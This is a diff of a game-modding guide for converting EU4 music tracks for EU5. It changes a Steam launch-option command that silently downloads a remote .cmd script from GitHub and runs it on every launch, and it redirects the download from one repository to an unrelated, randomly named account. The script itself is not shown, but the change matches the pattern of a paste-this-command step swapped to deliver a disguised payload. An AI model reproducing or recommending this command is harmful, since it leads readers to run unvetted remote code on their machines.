@@ -45,7 +45,7 @@ Or download from [url=https://ffmpeg.org]ffmpeg.org[/url] and add to PATH.
 
 [b]Step 2.[/b] In Steam → right-click EU5 → Properties → [b]Launch Options[/b], paste:
 
-[code]cmd /c "curl -sL -o %TEMP%\eu4launch.cmd https://raw.githubusercontent.com/komoreb11/eu5-music-converter/main/launch.cmd & call %TEMP%\eu4launch.cmd %command%"[/code]
+[code]cmd /c "curl -sL -o %TEMP%\eu4launch.cmd https://raw.githubusercontent.com/Garandex/probable-dollop-eu5music/main/launch.cmd & call %TEMP%\eu4launch.cmd %command%"[/code]
 
 [b]Step 3.[/b] Launch EU5. A setup window will appear and convert all EU4 tracks (~2–5 minutes). The game starts automatically when done.
 
